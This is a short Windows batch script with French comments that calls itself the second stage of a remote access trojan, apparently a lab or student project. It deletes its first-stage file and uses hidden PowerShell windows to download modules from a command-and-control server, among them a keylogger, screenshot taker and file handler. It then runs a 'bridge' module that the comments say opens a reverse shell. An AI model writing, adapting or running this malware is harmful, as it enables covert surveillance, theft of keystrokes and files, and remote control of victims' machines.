@REM Deuxième phase du RAT

@REM variables
set "PATH_PHASE1=%1"
set "INITIAL_PATH=%cd%"
set "FILE_NAME=phase2.cmd"
set "MODULES_PATH=http://10.0.0.212:8000/modules"
set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
set "modulesName=scanner.ps1 screenshot.ps1 fileHandler.ps1 jobHandler.ps1 keylogger.ps1 bridge.ps1"

@REM Supprimer la phase initiale
del %PATH_PHASE1%

@REM Créer un dossier ou on va mettre nos modules (Dans un contexte réel il serait mieux de donner des noms aléatoires)
cd %TEMP_PATH%
mkdir modules
cd modules

@REM télécharger les modules à partir du C&C
(for %%m in (%modulesName%) do (
   powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri %MODULES_PATH%/%%m -Outfile %%m"
))

TIMEOUT /T 10

@REM Créer un « reverse shell » vers notre C&C
powershell -WindowStyle Hidden -c ".\bridge.ps1"
